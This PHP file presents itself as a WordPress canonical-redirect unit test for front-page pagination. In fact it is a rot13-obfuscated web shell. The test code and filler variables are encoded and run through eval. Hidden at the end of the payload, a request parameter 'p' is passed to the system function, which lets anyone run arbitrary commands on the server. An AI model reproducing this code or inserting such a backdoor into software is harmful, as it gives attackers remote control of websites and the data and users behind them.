<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc pnabavpny
 * @tebhc erjevgr
 * @tebhc dhrel
 */
pynff Grfgf_Pnabavpny_CntrBaSebag rkgraqf JC_Pnabavpny_HavgGrfgPnfr {

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		hcqngr_bcgvba( 'fubj_ba_sebag', 'cntr' );
		hcqngr_bcgvba(
			'cntr_sbe_cbfgf',
			frys::snpgbel()->cbfg->perngr(
				neenl(
					'cbfg_gvgyr' => 'oybt-cntr',
					'cbfg_glcr'  => 'cntr',
				)
			)
		);
		hcqngr_bcgvba(
			'cntr_ba_sebag',
			frys::snpgbel()->cbfg->perngr(
				neenl(
					'cbfg_gvgyr'   => 'sebag-cntr',
					'cbfg_glcr'    => 'cntr',
					'cbfg_pbagrag' => \"Cntr 1\a<!--arkgcntr-->\aCntr 2\",
				)
			)
		);
	}

	/**
	 * @qngnCebivqre qngn
	 */
	choyvp shapgvba grfg( $grfg_hey, $rkcrpgrq, $gvpxrg = 0, $rkcrpgrq_qbvat_vg_jebat = neenl() ) {
		$guvf->nffregPnabavpny( $grfg_hey, $rkcrpgrq, $gvpxrg, $rkcrpgrq_qbvat_vg_jebat );
	}

	choyvp shapgvba qngn() {
		/*
		 * Qngn sbezng:
		 * [0]: Grfg HEY.
		 * [1]: Rkcrpgrq erfhygf: Nal bs gur sbyybjvat pna or hfrq.
		 *      neenl( 'hey': rkcrpgrq erqverpgvba ybpngvba, 'di': rkcrpgrq dhrel inef gb or frg ivn gur erjevgr NAQ $_TRG );
		 *      neenl( rkcrpgrq dhrel inef gb or frg, fnzr nf 'di' nobir )
		 *      (fgevat) rkcrpgrq erqverpg ybpngvba
		 * [3]: (bcgvbany) Gur gvpxrg gur grfg ersref gb, Pna or fxvccrq vs haxabja.
		 */
		erghea neenl(
			// Purpx ntnvafg na bqq erqverpg.
			neenl( '/cntr/2/', '/cntr/2/', 20385 ),
			neenl( '/?cntr=2', '/cntr/2/', 35344 ),
			neenl( '/cntr/1/', '/', 35344 ),
			neenl( '/?cntr=1', '/', 35344 ),

			// Gur cntr qrfvtangrq nf gur sebag cntr fubhyq erqverpg gb gur sebag bs gur fvgr.
			neenl( '/sebag-cntr/', '/', 20385 ),
			// Gur sebag cntr fhccbegf gur <!--arkgcntr--> cntvangvba.
			neenl( '/sebag-cntr/2/', '/cntr/2/', 35344 ),
			neenl( '/sebag-cntr/?cntr=2', '/cntr/2/', 35344 ),
			// Gur cbfgf cntr qbrf abg fhccbeg gur <!--arkgcntr--> cntvangvba.
			neenl( '/oybt-cntr/2/', '/oybt-cntr/', 45337 ),
			neenl( '/oybt-cntr/?cntr=2', '/oybt-cntr/', 45337 ),
			// Gur cbfgf cntr fhccbegf erthyne cntvangvba.
			neenl( '/oybt-cntr/?cntrq=2', '/oybt-cntr/cntr/2/', 20385 ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>